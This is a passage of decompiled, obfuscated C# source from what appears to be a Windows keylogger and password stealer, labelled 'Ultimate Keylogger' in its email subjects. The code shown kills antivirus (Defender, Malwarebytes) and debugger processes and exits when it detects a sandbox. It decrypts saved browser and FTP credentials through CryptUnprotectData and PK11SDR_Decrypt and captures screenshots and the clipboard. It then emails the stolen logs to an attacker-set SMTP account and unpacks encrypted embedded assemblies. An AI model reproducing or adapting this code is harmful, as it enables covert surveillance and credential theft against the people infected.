								IntPtr ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
								string_2 = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
								string_2 = Marshal.PtrToStringAnsi(intptr_);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							object? obj3 = Marshal.PtrToStructure(intPtr, @struct.GetType());
							@struct = ((obj3 != null) ? ((Class16.Struct12)obj3) : struct4);
							intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
							string string_3;
							if (Class34.lstrlenA(intptr_) != @struct.int_1)
							{
								IntPtr ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
								string_3 = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
								string_3 = Marshal.PtrToStringAnsi(intptr_);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							class16_0.list_0.Add(new Class15(class16_0.class14_0, string_0, string_2, string_3, Class34.smethod_14(ref @struct.struct11_0, class16_0), 1));
							continue;
						}
						return;
					}
				}
			}
			else if (struct2.int_4 == 0)
			{
				string string_3 = null;
				if ((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero))
				{
					return;
				}
				int num3 = struct2.int_2 - 1;
				for (int j = 0; j <= num3; j++)
				{
					object? obj4 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj4 != null) ? ((Class16.Struct12)obj4) : struct4);
					string string_2 = Strings.Space(@struct.int_1);
					IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					if (Class34.lstrlenA(intptr_) != @struct.int_1)
					{
						IntPtr ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					class16_0.list_0.Add(new Class15(class16_0.class14_0, string_0, string_2, string.Empty, Class34.smethod_14(ref @struct.struct11_0, class16_0), 0));
				}
			}
			gCHandle.Free();
			gCHandle2.Free();
		}
	}

	static void smethod_113(bool bool_0, Form1 form1_0, bool bool_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (bool_1)
			{
				if (process.MainWindowTitle.Contains("Mozilla Firefox"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0)
				{
					process.Kill();
				}
			}
			if (bool_0)
			{
				if (process.MainWindowTitle.Contains("Internet Explorer"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0)
				{
					process.Kill();
				}
			}
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	static extern int CredEnumerateW_2(IntPtr intptr_0, int int_0, ref int int_1, ref IntPtr intptr_1);

	static int smethod_114(Class41.Class45 class45_0, Class41.Class43 class43_0)
	{
		int num;
		int num2;
		if ((num = Class34.smethod_58(class43_0, 9)) >= 0)
		{
			if ((num2 = class45_0.short_0[num]) >= 0)
			{
				Class34.smethod_56(class43_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class34.smethod_58(class43_0, int_)) >= 0)
			{
				num2 = class45_0.short_0[num3 | (num >> 9)];
				Class34.smethod_56(class43_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class43_0.int_2;
			num = Class34.smethod_58(class43_0, int_2);
			num2 = class45_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class34.smethod_56(class43_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class43_0.int_2;
		num = Class34.smethod_58(class43_0, int_3);
		num2 = class45_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class34.smethod_56(class43_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static bool smethod_115(Class41.Class42 class42_0)
	{
		int num = Class34.smethod_97(class42_0.class44_0);
		while (num >= 258)
		{
			switch (class42_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class34.smethod_114(class42_0.class45_0, class42_0.class43_0)) & -256) == 0)
				{
					Class34.smethod_51(class42_0.class44_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class42_0.int_6 = Class41.Class42.int_0[num2 - 257];
					class42_0.int_5 = Class41.Class42.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class42_0.class45_1 = null;
				class42_0.class45_0 = null;
				class42_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class42_0.int_5 > 0)
				{
					class42_0.int_4 = 8;
					int num4 = Class34.smethod_58(class42_0.class43_0, class42_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class34.smethod_56(class42_0.class43_0, class42_0.int_5);
					class42_0.int_6 += num4;
				}
				class42_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class34.smethod_114(class42_0.class45_1, class42_0.class43_0);
				if (num2 >= 0)
				{
					class42_0.int_7 = Class41.Class42.int_2[num2];
					class42_0.int_5 = Class41.Class42.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class42_0.int_5 > 0)
				{
					class42_0.int_4 = 10;
					int num3 = Class34.smethod_58(class42_0.class43_0, class42_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class34.smethod_56(class42_0.class43_0, class42_0.int_5);
					class42_0.int_7 += num3;
				}
				Class34.smethod_146(class42_0.class44_0, class42_0.int_6, class42_0.int_7);
				num -= class42_0.int_6;
				class42_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static string smethod_116(Form1 form1_0)
	{
		string string_ = new string('\0', 100);
		Class34.GetWindowTextA(Class34.GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	static string smethod_117(Class9 class9_0, IntPtr intptr_0)
	{
		return Marshal.PtrToStringAnsi(intptr_0);
	}

	static void smethod_118()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 120:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001f;
						case 5:
							goto IL_0026;
						case 6:
							goto IL_002d;
						case 7:
							goto IL_0034;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0034:
					num = 7;
					Form1.Class6.smethod_0();
					break;
					IL_0007:
					num = 2;
					Class34.smethod_32("MSASCui");
					goto IL_0013;
					IL_0013:
					num = 3;
					Class34.smethod_32("msmpeng");
					goto IL_001f;
					IL_001f:
					num = 4;
					Class34.smethod_70();
					goto IL_0026;
					IL_0026:
					num = 5;
					Class34.smethod_104();
					goto IL_002d;
					IL_002d:
					num = 6;
					Class34.smethod_125();
					goto IL_0034;
					end_IL_0000_2:
					break;
				}
				num = 8;
				Form1.Class6.smethod_1();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 120;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_119(Form1 form1_0)
	{
		form1_0.vmethod_104().set_Text("Logs Only");
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress(form1_0.vmethod_4().get_Text());
		mailMessage.To.Add(form1_0.vmethod_0().get_Text());
		mailMessage.Subject = "Ultimate Logger" + ((ServerComputer)Class1.smethod_0()).get_Name().ToString() + "At " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Clock().get_LocalTime());
		mailMessage.Body = "ComputerInformation" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_128().get_Text() + form1_0.string_61 + form1_0.string_61 + "Installed Software" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_100().get_Text() + form1_0.string_61 + form1_0.string_61 + "Logs" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_6().get_Text() + form1_0.string_61 + form1_0.string_61 + "ClipBoard" + form1_0.string_61 + form1_0.string_60 + form1_0.string_61 + form1_0.string_61 + form1_0.string_61 + form1_0.string_61 + form1_0.string_62;
		Attachment item = new Attachment(form1_0.string_63);
		mailMessage.Attachments.Add(item);
		SmtpClient smtpClient = new SmtpClient(form1_0.vmethod_14().get_Text());
		smtpClient.Port = Conversions.ToInteger(form1_0.vmethod_16().get_Text());
		smtpClient.Credentials = new NetworkCredential(form1_0.vmethod_4().get_Text(), form1_0.vmethod_2().get_Text());
		smtpClient.EnableSsl = true;
		smtpClient.Send(mailMessage);
		((TextBoxBase)form1_0.vmethod_6()).Clear();
	}

	static int smethod_120(Class41.Class43 class43_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class43_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class43_0.uint_0;
			class43_0.uint_0 >>= 8;
			class43_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class43_0.int_1 - class43_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class43_0.byte_0, class43_0.int_0, byte_0, int_0, int_1);
		class43_0.int_0 += int_1;
		if (((uint)(class43_0.int_0 - class43_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class43_0.uint_0 = class43_0.byte_0[class43_0.int_0++] & 0xFFu;
			class43_0.int_2 = 8;
		}
		return num + int_1;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FileTimeToLocalFileTime(ref Class9.Struct4 struct4_0, ref Class9.Struct4 struct4_1);

	[DllImport("kernel32.dll")]
	static extern IntPtr LoadLibrary(string string_0);

	static void smethod_121(Form1 form1_0)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		form1_0.vmethod_104().set_Text("Logs+Clipboardlogger+screenlogger");
		form1_0.vmethod_94().set_Text(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + form1_0.vmethod_96().get_Text() + ".jpeg");
		Size size = new Size(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Point point = new Point(0, 0);
		Point point2 = new Point(0, 0);
		val2.CopyFromScreen(point, point2, size);
		((Image)val).Save(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + form1_0.vmethod_96().get_Text() + ".jpeg");
		Label val3 = form1_0.vmethod_96();
		val3.set_Text(Conversions.ToString(Conversions.ToDouble(val3.get_Text()) + 1.0));
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress(form1_0.vmethod_4().get_Text());
		mailMessage.To.Add(form1_0.vmethod_0().get_Text());
		mailMessage.Subject = "Ultimate Keylogger" + ((ServerComputer)Class1.smethod_0()).get_Name().ToString() + "At " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Clock().get_LocalTime());
		mailMessage.Body = "ComputerInformation" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_128().get_Text() + form1_0.string_61 + form1_0.string_61 + "Installed Software" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_100().get_Text() + form1_0.string_61 + form1_0.string_61 + "Logs" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_6().get_Text() + form1_0.string_61 + form1_0.string_61 + "ClipBoard Logs" + form1_0.string_61 + form1_0.string_60 + form1_0.string_61 + form1_0.string_61 + form1_0.string_61 + form1_0.string_62;
		Attachment item = new Attachment(form1_0.vmethod_94().get_Text());
		mailMessage.Attachments.Add(item);
		Attachment item2 = new Attachment(form1_0.string_63);
		mailMessage.Attachments.Add(item2);
		SmtpClient smtpClient = new SmtpClient(form1_0.vmethod_14().get_Text());
		smtpClient.Port = Conversions.ToInteger(form1_0.vmethod_16().get_Text());
		smtpClient.Credentials = new NetworkCredential(form1_0.vmethod_4().get_Text(), form1_0.vmethod_2().get_Text());
		smtpClient.EnableSsl = true;
		smtpClient.Send(mailMessage);
		((TextBoxBase)form1_0.vmethod_6()).Clear();
	}

	[DllImport("sqlite3")]
	static extern int sqlite3_finalize(IntPtr intptr_0);

	static string smethod_122(Form1 form1_0, string string_0)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		object objectValue = default(object);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_0018;
				case 156:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0018;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0018:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				object obj = objectValue;
				object[] array = new object[1] { string_0 };
				bool[] array2 = new bool[1] { true };
				object obj2 = NewLateBinding.LateGet(obj, (Type)null, "RegRead", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				text = Conversions.ToString(obj2);
				break;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 156;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int Uninitialize();

	static int smethod_123(Class41.Class43 class43_0)
	{
		return class43_0.int_2;
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptUnprotectData", ExactSpelling = true, SetLastError = true)]
	static extern int CryptUnprotectData_3(ref Class9.Struct6 struct6_0, int int_0, ref Class9.Struct6 struct6_1, int int_1, int int_2, int int_3, ref Class9.Struct6 struct6_2);

	static void smethod_124(Form1 form1_0)
	{
		if (File.Exists(form1_0.vmethod_94().get_Text()))
		{
			File.Delete(form1_0.vmethod_94().get_Text());
		}
	}

	static void smethod_125()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}

	static string smethod_126(Class18 class18_0)
	{
		return class18_0.string_0;
	}

	static int smethod_127(int int_0, ref Class21.Struct21 struct21_0, ref Class21.Struct21 struct21_1)
	{
		IntPtr procAddress = Class34.GetProcAddress(Class21.intptr_0, "PK11SDR_Decrypt");
		Class21.Delegate7 @delegate = (Class21.Delegate7)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class21.Delegate7));
		return @delegate(ref struct21_0, ref struct21_1, int_0);
	}

	static void smethod_128(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "mbam", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_129(string string_0, string string_1)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			Directory.CreateDirectory(string_1);
			ManagementClass val = new ManagementClass("Win32_Share");
			ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters("Create");
			methodParameters.set_Item("Description", (object)string_0);
			methodParameters.set_Item("Name", (object)string_0);
			methodParameters.set_Item("Path", (object)string_1);
			methodParameters.set_Item("Type", (object)0);
			ManagementBaseObject val2 = ((ManagementObject)val).InvokeMethod("Create", methodParameters, (InvokeMethodOptions)null);
			if ((long)Conversions.ToUInteger(val2.get_Properties().get_Item("ReturnValue").get_Value()) == 0L && Directory.Exists(string_1))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
				directoryInfo.Attributes = FileAttributes.Hidden;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int BuildAuthTokenRequest(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_1, ref IntPtr intptr_0);

	static void smethod_130(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "ollydbg", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_131(Class39 class39_0)
	{
		class39_0.type_0.GetMethod("Clear")!.Invoke(class39_0.object_0, new object[0]);
	}

	static void smethod_132(Class16 class16_0)
	{
		class16_0.list_0.Clear();
		Class14 class14_ = class16_0.class14_0;
		Guid guid_ = class16_0.guid_0;
		Guid guid_2 = class16_0.guid_0;
		Class13 @class = Class34.smethod_20(guid_, class14_, guid_2);
		if (@class == null)
		{
			return;
		}
		int num = 0;
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = @class.System_002ECollections_002EIEnumerable_002EGetEnumerator();
			while (enumerator.MoveNext())
			{
				Class12 class12_ = (Class12)enumerator.Current;
				if (num % 2 == 0)
				{
					Class34.smethod_112(class16_0, Strings.Mid(Class34.smethod_93(class12_), 1, checked(Strings.InStr(Class34.smethod_93(class12_), ":String", (CompareMethod)0) - 1)));
				}
				num = checked(num + 1);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	[DllImport("pstorec.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int PStoreCreateInstance(ref GInterface3 ginterface3_0, ref Guid guid_0, int int_0, int int_1);

	static string smethod_133(Form1 form1_0)
	{
		string string_ = Interaction.Environ("APPDATA") + "\\CoreFTP\\sites.idx";
		string text = Class34.smethod_151(form1_0, string_);
		string text2 = Class34.smethod_122(form1_0, "HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + text + "\\Host");
		string text3 = Class34.smethod_122(form1_0, "HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + text + "\\Port");
		string text4 = Class34.smethod_122(form1_0, "HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + text + "\\User");
		string text5 = Class34.smethod_122(form1_0, "HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + text + "\\PW");
		string text6 = Class34.smethod_122(form1_0, "HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + text + "\\Name");
		if (Operators.CompareString(text4, "", false) != 0)
		{
			return "Entry: " + text6 + "\r\nHost: " + text2 + ":" + text3 + "\r\nUser: " + text4 + "\r\nPwd: " + text5 + " (Encrypt)";
		}
		return "Nothing Found";
	}

	static void smethod_134(Form1 form1_0)
	{
		if (File.Exists(form1_0.string_45 + "\\cdkeys.txt"))
		{
			File.Delete(form1_0.string_45 + "\\cdkeys.txt");
		}
	}

	static byte[] smethod_135(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class34.smethod_149(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class41.Stream0 stream = new Class41.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class34.smethod_59(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class34.smethod_35(stream);
			int num3 = Class34.smethod_35(stream);
			int num4 = Class34.smethod_35(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class34.smethod_59(stream);
			Class34.smethod_59(stream);
			Class34.smethod_59(stream);
			int num5 = Class34.smethod_59(stream);
			int num6 = Class34.smethod_35(stream);
			int num7 = Class34.smethod_35(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class41.Class42 class42_ = new Class41.Class42(array2);
			array = new byte[num5];
			Class34.smethod_26(array, array.Length, class42_, 0);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class34.smethod_59(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class34.smethod_59(stream);
					num11 = Class34.smethod_59(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class41.Class42 class42_2 = new Class41.Class42(array3);
					Class34.smethod_26(array, num11, class42_2, i);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 198, 233, 96, 32, 24, 173, 118, 103 };
				byte[] byte_2 = new byte[8] { 20, 120, 37, 217, 0, 220, 239, 129 };
				using Class40 class40_ = new Class40();
				using ICryptoTransform cryptoTransform = Class34.smethod_159(bool_0: true, byte_2, byte_, class40_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class34.smethod_135(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class39 class39_ = new Class39();
				using ICryptoTransform cryptoTransform2 = Class34.smethod_108(byte_5, byte_4, bool_0: true, class39_);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class34.smethod_135(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static int smethod_136(Class41.Class44 class44_0)
	{
		return class44_0.int_1;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "LocalFree", ExactSpelling = true, SetLastError = true)]
	static extern int LocalFree_1(int int_0);

	static Assembly smethod_137(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class31.Struct23 @struct = new Class31.Struct23(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2RmMjI0NmM3LTllMTktNDFhMC1hNjZiLThhZjNkNDVkYmQ2M30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{13b4fc4f-30d4-49e4-a7f3-91ee6bf9c927},e2RmMjI0NmM3LTllMTktNDFhMC1hNjZiLThhZjNkNDVkYmQ2M30=,[z]{13b4fc4f-30d4-49e4-a7f3-91ee6bf9c927}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			lock (Class31.hashtable_0)
			{
				if (Class31.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class31.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class34.smethod_135(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
